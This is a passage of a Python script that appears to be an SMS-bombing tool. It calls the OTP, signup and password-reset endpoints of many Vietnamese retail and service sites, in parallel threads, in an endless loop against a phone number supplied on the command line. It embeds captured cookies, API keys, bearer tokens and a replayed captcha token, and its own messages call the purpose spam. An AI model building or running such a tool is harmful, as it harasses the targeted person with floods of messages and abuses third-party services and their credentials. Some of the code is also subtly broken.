  "Sec-Ch-Ua": "\"Not/A)Brand\";v=\"8\", \"Chromium\";v=\"126\", \"Google Chrome\";v=\"126\"",
  "Sec-Ch-Ua-Mobile": "?0",
  "Sec-Ch-Ua-Platform": "\"Windows\"",
  "Sec-Fetch-Dest": "empty",
  "Sec-Fetch-Mode": "cors",
  "Sec-Fetch-Site": "same-origin",
  "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
  "X-Requested-With": "XMLHttpRequest"
}

		
	response = requests.post(url, data=data, headers=headers)
def beautybox(phone):
	url = "https://beautybox-api.hsv-tech.io/client/phone-verification/request-verification"
	payload = {
		"phoneNumber": "84" + phone[1:],
	}
	
	headers = {
		"accept": "application/json, text/plain, */*",
		"accept-language": "vi",
		"content-type": "application/json",
		"key": "a0a128f4e822ffbb9607c9012e90b102",
		"origin": "https://beautybox.com.vn",
		"priority": "u=1, i",
		"referer": "https://beautybox.com.vn/",
		"sec-ch-ua": "\"Google Chrome\";v=\"125\", \"Chromium\";v=\"125\", \"Not.A/Brand\";v=\"24\"",
		"sec-ch-ua-mobile": "?0",
		"sec-ch-ua-platform": "\"Windows\"",
		"sec-fetch-dest": "empty",
		"sec-fetch-mode": "cors",
		"sec-fetch-site": "cross-site",
		"timestamp": "1716203261528",
		"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
	}
		
	response = requests.post(url, headers=headers, json=payload)
def ghnexpress(phone):
	headers = {
		"accept": "application/json, text/plain, */*",
		"accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5",
		"content-type": "application/json",
		"origin": "https://sso.ghn.vn",
		"priority": "u=1, i",
		"referer": "https://sso.ghn.vn/",
		"sec-ch-ua": "\"Google Chrome\";v=\"125\", \"Chromium\";v=\"125\", \"Not.A/Brand\";v=\"24\"",
		"sec-ch-ua-mobile": "?0",
		"sec-ch-ua-platform": "\"Windows\"",
		"sec-fetch-dest": "empty",
		"sec-fetch-mode": "cors",
		"sec-fetch-site": "same-site",
		"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
	}

	payload = {
		"phone": phone,
		"type": "register",
	}

	response = requests.post("https://online-gateway.ghn.vn/sso/public-api/v2/client/sendotp", headers=headers, json=payload)
def pico(phone):
	url = "https://auth.pico.vn/user/api/auth/register"
	url2 = "https://auth.pico.vn/user/api/auth/login/request-otp"
	
	payload = json.dumps({
		"name": "Lê Quốc Việt ",
		"phone": phone,
		"provinceCode": "01",
		"districtCode": "250",
		"wardCode": "08989",
		"address": f"{random.randint(10, 99)} Hồ Hoàng Kiếm, Hà Nội"
	})
	
	payload2 = json.dumps({
		"phone": phone
	})

	headers = {
		"User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
		"Content-Type": "application/json",
		"region-code": "MB",
		"sec-ch-ua": "\"Not-A.Brand\";v=\"99\", \"Chromium\";v=\"124\"",
		"accept-language": "vi",
		"sec-ch-ua-mobile": "?1",
		"sec-ch-ua-platform": "\"Android\"",
		"origin": "https://m.pico.vn",
		"sec-fetch-site": "same-site",
		"sec-fetch-mode": "cors",
		"sec-fetch-dest": "empty",
		"referer": "https://m.pico.vn/"
	}
	
	headers2 = {
		"User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
		"Accept": "application/json, text/plain, */*",
		"Content-Type": "application/json",
		"party": "ecom",
		"region-code": "MB",
		"sec-ch-ua": "\"Not-A.Brand\";v=\"99\", \"Chromium\";v=\"124\"",
		"accept-language": "vi",
		"access": "206f5b6838b4e357e98bf68dbb8cdea5",
		"sec-ch-ua-mobile": "?1",
		"uuid": "5387940ea6724ccaa540492c0e664451",
		"platform": "Mobile",
		"channel": "b2c",
		"sec-ch-ua-platform": "\"Android\"",
		"origin": "https://m.pico.vn",
		"sec-fetch-site": "same-site",
		"sec-fetch-mode": "cors",
		"sec-fetch-dest": "empty",
		"referer": "https://m.pico.vn/"
	}
		
	requests.post(url, data=payload, headers=headers)
	response = requests.post(url2, data=payload2, headers=headers2)
def circa(phone):
	url = "https://api.circa.vn/v1/entity/validation-phone"
	
	payload = {
		"phone": {
			"country_code": "84",
			"phone_number": phone[1:],
		},
	}
	
	headers = {
		"accept": "application/json, text/plain, */*",
		"accept-language": "vi-VN",
		"content-type": "application/json",
		"origin": "https://circa.vn",
		"priority": "u=1, i",
		"referer": "https://circa.vn/",
		"sec-ch-ua": "\"Google Chrome\";v=\"125\", \"Chromium\";v=\"125\", \"Not.A/Brand\";v=\"24\"",
		"sec-ch-ua-mobile": "?0",
		"sec-ch-ua-platform": "\"Windows\"",
		"sec-fetch-dest": "empty",
		"sec-fetch-mode": "cors",
		"sec-fetch-site": "same-site",
		"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
	}
		
	response = requests.post(url, headers=headers, json=payload)
def fmplus(phone):
	url = "https://api.fmplus.com.vn/api/1.0/auth/verify/send-otp-v2"
	
	payload = {
		"Phone": phone,
		"LatOfMap": "106",
		"LongOfMap": "108",
		"Browser": "",
	}
	
	headers = {
		"accept": "application/json, text/plain, */*",
		"accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5",
		"authorization": "Bearer",
		"content-type": "application/json;charset=UTF-8",
		"origin": "https://fm.com.vn",
		"priority": "u=1, i",
		"referer": "https://fm.com.vn/",
		"sec-ch-ua": "\"Google Chrome\";v=\"125\", \"Chromium\";v=\"125\", \"Not.A/Brand\";v=\"24\"",
		"sec-ch-ua-mobile": "?0",
		"sec-ch-ua-platform": "\"Windows\"",
		"sec-fetch-dest": "empty",
		"sec-fetch-mode": "cors",
		"sec-fetch-site": "cross-site",
		"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
		"x-apikey": "X2geZ7rDEDI73K1vqwEGStqGtR90JNJ0K4sQHIrbUI3YISlv",
		"x-emp": "",
		"x-fromweb": "true",
		"x-requestid": "03f0f69d-77ff-4484-b322-e2f22d42f208",
	}
	
	response = requests.post(url, headers=headers, json=payload)
def batdongsan(phone) -> dict:
	url = "https://batdongsan.com.vn/user-management-service/api/v1/Otp/SendToRegister"

	params = {
		"phoneNumber": phone
	}
		
	headers = {
		"User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
		"Accept": "application/json, text/plain, */*",
		"sec-ch-ua": "\"Not-A.Brand\";v=\"99\", \"Chromium\";v=\"124\"",
		"sec-ch-ua-mobile": "?1",
		"sec-ch-ua-platform": "\"Android\"",
		"sec-fetch-site": "same-origin",
		"sec-fetch-mode": "cors",
		"sec-fetch-dest": "empty",
		"referer": "https://batdongsan.com.vn/sellernet/trang-dang-ky",
		"accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5",
		"Cookie": "con.ses.id=ede62ec1-5869-42fa-a25b-2a82f5681add; _cfuvid=pnGURJA6AjbX2behAjLVAjDrA0foM5Gl6rf1IrlYWXQ-1716206807321-0.0.1.1-604800000; _gid=GA1.3.1122086402.1716206816; _gat_UA-3729099-1=1; _tt_enable_cookie=1; _ttp=h3iKvuCclRL-MmhoBdthY55HV6H; __gads=ID=3556c5d3404f5e64:T=1716206823:RT=1716206823:S=ALNI_Mae_7FHcq5r3kk9wjuJ8OCXCM09nA; __gpi=UID=00000e250d3b27b3:T=1716206823:RT=1716206823:S=ALNI_MZaRZIqqYVIIrVOy6s8SExUj1Un5A; __eoi=ID=2b6c305344e4ae11:T=1716206823:RT=1716206823:S=AA-AfjYrXYNnomyUSIWR2Cd_kENT; _hjSession_1708983=eyJpZCI6IjQ3Y2U3OTY5LTlmNGEtNDc1ZS1iNTM5LTVmZDBhODdjYWNjYiIsImMiOjE3MTYyMDY4MjM5NDksInMiOjAsInIiOjAsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjoxLCJzcCI6MH0=; _hjHasCachedUserAttributes=true; cf_clearance=B98t.pUSClHYWlBLIKaCJfktCcHy2Hse1050S819gEU-1716206826-1.0.1.1-eyCJNlJIF4eH5OaqSzU4APo9GURAVZhUP_tMwlQkdP0hEXEwbw1sLOqnEYTQ7bRyarzP6RVRUXBGBYfSO_ILSg; _gcl_au=1.1.1476705456.1716206827; con.unl.usr.id=%7B%22key%22%3A%22userId%22%2C%22value%22%3A%22b8117909-86ba-4b0f-91a2-84424cf9460a%22%2C%22expireDate%22%3A%222025-05-20T19%3A07%3A07.3667265Z%22%7D; con.unl.cli.id=%7B%22key%22%3A%22clientId%22%2C%22value%22%3A%22fab4b619-9ada-4491-8a80-7c91ca2cea78%22%2C%22expireDate%22%3A%222025-05-20T19%3A07%3A07.3667711Z%22%7D; _fbp=fb.2.1716206827274.1622498093; desapp=sellernet01; SERVERID=64; __zi=2000.SSZzejyD6jy_Zl2jp1eKttQU_gxC3nMGTChWuC8NLyncmFxoW0L1tccUz_F4J47VO9FrziS8GTrYsVNum0r6qZ8oC0.1; _ga=GA1.3.791460359.1716206816; _hjSessionUser_1708983=eyJpZCI6ImFmMGI5MmU4LTJjN2ItNTBhZS04NDkwLTY2NWJhZjY0YWNlMyIsImNyZWF0ZWQiOjE3MTYyMDY4MjM5MzYsImV4aXN0aW5nIjp0cnVlfQ==; ab.storage.deviceId.2dca22f5-7d0d-4b29-a49e-f61ef2edc6e9=%7B%22g%22%3A%22ec0d7621-429e-c9d1-1246-f9799d38059b%22%2C%22c%22%3A1716206847070%2C%22l%22%3A1716206847070%7D; _ga_HTS298453C=GS1.1.1716206816.1.1.1716206847.29.0.0"
	}
		
	response = requests.get(url, params=params, headers=headers)
def vietlott(phone):
	url = "https://api-mobi.vietlottsms.vn/mobile-api/register/registerWithPhoneNumber"
	
	payload = json.dumps({
		"phoneNumber": phone
	})
	
	headers = {
		"Host": "api-mobi.vietlottsms.vn",
		"Connection": "keep-alive",
		"Content-Length": "28",
		"ClientCallAPI": "EMB",
		"deviceId": "",
		"sec-ch-ua-mobile": "?1",
		"User-Agent": "Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
		"Content-Type": "application/json",
		"Accept": "/",
		"partnerChannel": "WEB",
		"Identify-Device-Token": "",
		"checkSum": "887e5218c679e1fe26b48cc642532a39909f619868f09d415b7d13cd43784f36",
		"sec-ch-ua-platform": "\"Android\"",
		"Origin": "https://vietlott-sms.vn",
		"Sec-Fetch-Site": "cross-site",
		"Sec-Fetch-Mode": "cors",
		"Sec-Fetch-Dest": "empty",
		"Referer": "https://vietlott-sms.vn/",
		"Accept-Encoding": "gzip, deflate, br",
		"Accept-Language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ru;q=0.4"
	}
		
	response = requests.post(url, headers=headers, data=payload)
def gapowork(phone):
	url = "https://api.gapowork.vn/auth/v3.1/check-phone-number"
	url2 = "https://api.gapowork.vn/auth/v3.1/signup"
	url3 = "https://api.gapowork.vn/auth/v3.1/forgot-password"

	payload = json.dumps({
		"phone_number": phone
	})
	
	payload2 = json.dumps({
		"phone_number": phone,
		"device_id": "9434ec2e-61e7-4b48-913b-ec9eaf31220b",
		"device_model": "web"
	})
		
	headers = {
		"User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
		"Accept": "application/json, text/plain, */*",
		"Content-Type": "application/json",
		"sec-ch-ua": "\"Not-A.Brand\";v=\"99\", \"Chromium\";v=\"124\"",
		"x-gapo-lang": "vi",
		"sec-ch-ua-mobile": "?1",
		"sec-ch-ua-platform": "\"Android\"",
		"origin": "https://www.gapowork.vn",
		"sec-fetch-site": "same-site",
		"sec-fetch-mode": "cors",
		"sec-fetch-dest": "empty",
		"referer": "https://www.gapowork.vn/",
		"accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5"
	}
	
	headers2 = {
		"User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
		"Accept": "application/json, text/plain, */*",
		"Content-Type": "application/json",
		"sec-ch-ua": "\"Not-A.Brand\";v=\"99\", \"Chromium\";v=\"124\"",
		"x-gapo-lang": "vi",
		"sec-ch-ua-mobile": "?1",
		"sec-ch-ua-platform": "\"Android\"",
		"origin": "https://www.gapowork.vn",
		"sec-fetch-site": "same-site",
		"sec-fetch-mode": "cors",
		"sec-fetch-dest": "empty",
		"referer": "https://www.gapowork.vn/",
		"accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5"
	}
		
	response = requests.post(url, data=payload, headers=headers)
	
	if response.status_code == 404:
		response = requests.post(url2, data=payload2, headers=headers2)
		
		return dict(status=response.status_code, content=response.text)
	elif response.status_code == 200:
		response = requests.post(url3, data=payload2, headers=headers2)
		
		return dict(status=response.status_code, content=response.text)
def winmart(phone: str, type: str = "sms") -> dict:
	url = "https://api-crownx.winmart.vn/iam/api/v1/user/register"
	url2 = "https://api-crownx.winmart.vn/iam/api/v1/user/forgot-pwd"
	
	payload = json.dumps({
		"firstName": "Huy Hoang",
		"phoneNumber": phone,
		"masanReferralCode": "",
		"dobDate": "2001-01-01",
		"gender": "Male"
	})
	
		
	headers = {
		"User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
		"Accept": "application/json",
		"Content-Type": "application/json",
		"sec-ch-ua": "\"Not-A.Brand\";v=\"99\", \"Chromium\";v=\"124\"",
		"sec-ch-ua-mobile": "?1",
		"authorization": "Bearer undefined",
		"x-api-merchant": "WCM",
		"sec-ch-ua-platform": "\"Android\"",
		"origin": "https://winmart.vn",
		"sec-fetch-site": "same-site",
		"sec-fetch-mode": "cors",
		"sec-fetch-dest": "empty",
		"referer": "https://winmart.vn/",
		"accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5"
	}
		
	response = requests.post(url, data=payload, headers=headers)
def cellphone(phone):
    url='https://customer.cps.onl/subscriptions-api/store'
    url1='https://api.cellphones.com.vn/v4/auth/register'
    url2='https://api.cellphones.com.vn/v3/otp/phone/send'
    headers={
  "authority": "customer.cps.onl",
  "method": "POST",
  "scheme": "https",
  "Accept": "application/json, text/plain, */*",
  "Accept-Encoding": "gzip, deflate, br, zstd",
  "Accept-Language": "en-US,en;q=0.9",
  "Authorization": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJhdWQiOiI3IiwianRpIjoiODI3M2NmNmJmMGUwM2ZjYTE5Y2ZlYmI3YTc5NWRkMTM3NjY1M2IwY2I1MWFkZWZjM2E3YzIxYjFkOTg5NzJlODgyMmZhMmU5Yjc2NWQyM2IiLCJpYXQiOjE2MzY3OTA0MDkuMjY1NDExLCJuYmYiOjE2MzY3OTA0MDkuMjY1NDE4LCJleHAiOjQ3OTI0NjQwMDkuMjUzODk5LCJzdWIiOiIiLCJzY29wZXMiOlsic3Vic2NyaXB0aW9uX3Bvc3QiXX0.Ts9AEfv81AOrAl71ZF4v6hBow06-9lWxoF4m7ook9OxL2TlnTHXvSf3zuStPCLtvS17Sym_W_GROA-vuj7zG6Sg7q_3sKcjztYR8eiXLEOl-I26pFaHle6z3VYlhZE645BPLnAwtv5bZbV39uaDwMf7nNCdywAD5pJtzV1spgDG31E_OTpL-XVlBjdQIPgXxJgin6jEsFb_4H24WfBUd-nEgDZ6RYKuKOtasJSGOEJ3ClbGOnkcPFoTDwafLehOMcts2ImEZtSbsK3vtB7P7MOZtm3L1xQhJzY79vz9_Br28k8AdX5WV1eJ0OWqS-pXoJgAENwZEq6BjiACtUDMeA0PUDeBS54Ae69nyGfKuB7FQSlrr2JblUiUE_4mpT34hXRSiQIXGsNciGRussGmXTKFsuQH6pBbigTE7Yhzwo0fDty3oAXvfMpL-T2NAE9m3skqfpUJoSsVcA10uOleDNAoE2mc9kfTnWDdOhY4gIC92xv0Y-zUzuLCXmSdYj5R5lVC7Qpn0cJ0bZcyGuOnkOO8mgMXbd5pY0WQ_OKd2tgO1clndwQoV6EOo3aemcbbc1zPR1RXr_lb-mUsYTUpdp8vVtEpxt_0NOVoUIX2TQjkltoo95mOT81t9-sqzOPG1RrWkMKJI34ocKNScyu0ZckFoQY_-KloFJtFEkuQmd34",
  "Content-Length": "0",
  "Origin": "https://account.cellphones.com.vn",
  "Priority": "u=1, i",
  "Referer": "https://account.cellphones.com.vn/",
  "Sec-Ch-Ua": "\"Not/A)Brand\";v=\"8\", \"Chromium\";v=\"126\", \"Google Chrome\";v=\"126\"",
  "Sec-Ch-Ua-Mobile": "?0",
  "Sec-Ch-Ua-Platform": "\"Windows\"",
  "Sec-Fetch-Dest": "empty",
  "Sec-Fetch-Mode": "cors",
  "Sec-Fetch-Site": "cross-site",
  "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
}
    headers1={
  ":authority": "api.cellphones.com.vn",
  ":method": "POST",
  ":path": "/v4/auth/register",
  ":scheme": "https",
  "Accept": "application/json, text/plain, */*",
  "Accept-Encoding": "gzip, deflate, br, zstd",
  "Accept-Language": "en-US,en;q=0.9",
  "Content-Length": "679",
  "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundary2wBgABsBYlQAZrHI",
  "Origin": "https://account.cellphones.com.vn",
  "Priority": "u=1, i",
  "Referer": "https://account.cellphones.com.vn/",
  "Sec-Ch-Ua": "\"Not/A)Brand\";v=\"8\", \"Chromium\";v=\"126\", \"Google Chrome\";v=\"126\"",
  "Sec-Ch-Ua-Mobile": "?0",
  "Sec-Ch-Ua-Platform": "\"Windows\"",
  "Sec-Fetch-Dest": "empty",
  "Sec-Fetch-Mode": "cors",
  "Sec-Fetch-Site": "same-site",
  "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
}
    headers2={
  ":authority": "api.cellphones.com.vn",
  ":method": "POST",
  ":path": "/v3/otp/phone/send",
  ":scheme": "https",
  "Accept": "application/json, text/plain, */*",
  "Accept-Encoding": "gzip, deflate, br, zstd",
  "Accept-Language": "en-US,en;q=0.9",
  "Content-Length": "83",
  "Content-Type": "application/json",
  "Origin": "https://account.cellphones.com.vn",
  "Priority": "u=1, i",
  "Referer": "https://account.cellphones.com.vn/",
  "Sec-Ch-Ua": "\"Not/A)Brand\";v=\"8\", \"Chromium\";v=\"126\", \"Google Chrome\";v=\"126\"",
  "Sec-Ch-Ua-Mobile": "?0",
  "Sec-Ch-Ua-Platform": "\"Windows\"",
  "Sec-Fetch-Dest": "empty",
  "Sec-Fetch-Mode": "cors",
  "Sec-Fetch-Site": "same-site",
  "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
}
    data={
  "phone": phone,
  "fullname": "Huy Hoang",
  "type": "cellphones",
  "page_url": "https://cellphones.com.vn/smember/register",
  "g-respone-recaptcha": "",
  "service": "SMEMBER",
  "product_id": "999999",
  "opt_in": "1"
}
    data1={
  "name": "Huy Hoang",
  "phone": phone,
  "birthday": "1999-11-02",
  "password": "hoang123@",
  "password_confirmation": "hoang123@",
  "g-recaptcha-response": ""
}
    response = requests.post(url, data=data, headers=headers)
    if response.status_code == 200:
         b = requests.post(url1,data=data1,headers=headers1)
         if b.status_code== 200:
              b.json()
              token=b['data']['active_token']
              data2={
  "active_token": token,
  "phone": phone
}
              requests.post(url2,headers=headers2,data=data2)
def tiki():
    headers={
  "Accept": "application/json, text/plain, */*",
  "Accept-Encoding": "gzip, deflate, br, zstd",
  "Accept-Language": "en-US,en;q=0.9",
  "Connection": "keep-alive",
  "Content-Length": "136",
  "Content-Type": "application/json;charset=UTF-8",
  "Cookie": "_trackity=8b6380e4-dbef-1036-8a12-12e0b03c22d2; TIKI_GUEST_TOKEN=2SVfNqvRrUasiAy6L0OQFYpZtCDkHlMm; TOKENS={\"access_token\":\"2SVfNqvRrUasiAy6L0OQFYpZtCDkHlMm\",\"expires_in\":157680000,\"expires_at\":1879583676424,\"guest_token\":\"2SVfNqvRrUasiAy6L0OQFYpZtCDkHlMm\"}; tiki_client_id=; _ga_S9GLR1RQFJ=GS1.1.1721903676.1.0.1721903676.60.0.0; _ga=GA1.1.569124934.1721903677; delivery_zone=Vk4wMzQwMjQwMTM=; _gcl_au=1.1.1535401674.1721903682; _hjSessionUser_522327=eyJpZCI6IjA3ZWIxODViLWUwNzMtNWE1Zi1hN2FhLTYzMWY4MWNlMDgyMCIsImNyZWF0ZWQiOjE3MjE5MDM2ODI4MzUsImV4aXN0aW5nIjpmYWxzZX0=; _hjSession_522327=eyJpZCI6IjNmYzE4YjM4LWYyMTUtNDY5ZC05Yjg1LTgwMmY1MjcyN2I5MCIsImMiOjE3MjE5MDM2ODI4MzcsInMiOjAsInIiOjAsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjoxLCJzcCI6MH0=; _fbp=fb.1.1721903684247.822537804142038804; __uidac=0166a22a443e8e1b5f207627d9fb7da5; dtdz=7d5bddcc-2282-57ed-a3fb-1660ef850c58; __adm_upl=eyJ0aW1lIjoxNzIxOTAzNjkwLCJfdXBsIjpudWxsfQ==; __iid=749; __iid=749; __su=0; __su=0; __RC=26; __R=1; __uif=__uid%3A8721903684733280935%7C__ui%3A-1%7C__create%3A1721903684; amp_99d374=m3L4inKNXoIndXMi6EoX6I...1i3kn9tod.1i3knavje.4.6.a",
  "Host": "tiki.vn",
  "Origin": "https://tiki.vn",
  "Referer": "https://tiki.vn/",
  "sec-ch-ua": "\"Not/A)Brand\";v=\"8\", \"Chromium\";v=\"126\", \"Google Chrome\";v=\"126\"",
  "sec-ch-ua-mobile": "?0",
  "sec-ch-ua-platform": "\"Windows\"",
  "Sec-Fetch-Dest": "empty",
  "Sec-Fetch-Mode": "cors",
  "Sec-Fetch-Site": "same-origin",
  "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
  "x-guest-token": "2SVfNqvRrUasiAy6L0OQFYpZtCDkHlMm"
}
    data={
  "phone_number": phone,
  "captcha": {
    "status": "passed",
    "seccode": "YmVhZGZjNGEtNDllMy00NGMzLWI5M2ItMDIxZjUyNmI5M2Q1",
    "type": "puzzle"
  }
}
    requests.post('https://tiki.vn/api/v2/customers/otp_codes',headers=headers,data=data)
def dienmayxanh():
    headers={
  "Accept": "*/*",
  "Accept-Encoding": "gzip, deflate, br, zstd",
  "Accept-Language": "en-US,en;q=0.9",
  "Connection": "keep-alive",
  "Content-Length": "234",
  "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
  "Cookie": "TBMCookie_3209819802479625248=868968001721906846sj22N6/vYoIBv1F/mt0mMkY9NvQ=; ___utmvm=###########; mwgngxpv=3; .AspNetCore.Antiforgery.SuBGfRYNAsQ=CfDJ8LmkDaXB2QlCm0k7EtaCd5SdTi44ip7pF1nBr_l2gB4hCZDhSMPzZ2qSouSsVOXEKJ8W8epYyavxHcSNb_IAZgCSA2AXNabqqgwx_nZX7GpGUVs90h42aHkME8i190t_kf8f3GkX-4txHB_uRpcDbNM; DMX_Personal=%7B%22UID%22%3A%22a71de057a94a843c8db274ffd14be3bf2e705edc%22%2C%22ProvinceId%22%3A3%2C%22Address%22%3Anull%2C%22Culture%22%3A%22vi-3%22%2C%22Lat%22%3A0.0%2C%22Lng%22%3A0.0...",
  "Host": "www.dienmayxanh.com",
  "Origin": "https://www.dienmayxanh.com",
  "Referer": "https://www.dienmayxanh.com/lich-su-mua-hang/dang-nhap",
  "sec-ch-ua": "\"Not/A)Brand\";v=\"8\", \"Chromium\";v=\"126\", \"Google Chrome\";v=\"126\"",
  "sec-ch-ua-mobile": "?0",
  "sec-ch-ua-platform": "\"Windows\"",
  "Sec-Fetch-Dest": "empty",
  "Sec-Fetch-Mode": "cors",
  "Sec-Fetch-Site": "same-origin",
  "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
  "X-Requested-With": "XMLHttpRequest"
}
    params = f'phoneNumber={phone}&isReSend=false&sendOTPType=1&__RequestVerificationToken=CfDJ8LmkDaXB2QlCm0k7EtaCd5R0uMEuOOE5m-Q6cPXuXfQY1nsABVZ655PDAWjeuiCK-b8xESrL7w75k8bmuhqTeFnLMsz29UiIJ9vEYRO5nLUsFxumRW9Um7rsuOV5xqP-9YEN3Z_KZEKPRP1x2CaSDm8'
    requests.post('https://www.dienmayxanh.com/lich-su-mua-hang/LoginV2/GetVerifyCode',headers=headers,params=params)
def spam(phone):
    globals_dict = globals().copy()
    functions_to_call = [func for func_name, func in globals_dict.items() if callable(func) and func_name.startswith('sms')]  
    with ThreadPoolExecutor(max_workers=10) as executor:
        results = executor.map(lambda func: func(phone), functions_to_call)
        for result in results:
            pass
def banner():
    banners = f'''

 /$$   /$$                                        
| $$$ | $$                                        
| $$$$| $$  /$$$$$$   /$$$$$$  /$$$$$$$  /$$$$$$$ 
| $$ $$ $$ /$$__  $$ /$$__  $$| $$__  $$| $$__  $$
| $$  $$$$| $$$$$$$$| $$  \ $$| $$  \ $$| $$  \ $$
| $$\  $$$| $$_____/| $$  | $$| $$  | $$| $$  | $$
| $$ \  $$|  $$$$$$$|  $$$$$$/| $$  | $$| $$  | $$
|__/  \__/ \_______/ \______/ |__/  |__/|__/  |__/
                                                  
                                                  
                                                  '''
    purple = Colors.StaticMIX((Col.purple, Col.blue))
    dark = Col.dark_gray
    print(Colorate.Diagonal(Colors.DynamicMIX((purple, dark)), Center.XCenter(banners)))
if __name__ == "__main__":
    blacklist = ['111', '114', '113', '115']
    banner()
    
    if len(sys.argv) != 2:
        print('\x1b[38;5;255m[\x1b[38;5;196m*\x1b[38;5;255m] Lưu ý: Vui lòng nhập đúng định dạng nếu cố tình nhập sai tool sẽ không spam.\n')
        print("Usage: python main.py <phone>")
        sys.exit(1)

    phone = sys.argv[1]

    if phone in blacklist:
        print(f'\x1b[38;5;196m[\x1b[38;5;255m!\x1b[38;5;196m] Số điện thoại {phone} nằm trong danh sách đen. Không thể spam.')
        sys.exit(1)

    while True:
        print(f'\x1b[38;2;255;255;255mS\x1b[38;2;239;224;239mP\x1b[38;2;224;193;224mA\x1b[38;2;209;163;209mM\x1b[38;2;194;132;194mM\x1b[38;2;178;102;178mI\x1b[38;2;163;71;163mN\x1b[38;2;148;40;148mG\x1b[0m =>> \x1b[38;2;148;40;148m[\x1b[38;5;255m{phone}\x1b[38;2;148;40;148m]\x1b[38;5;255m')
        spam(phone)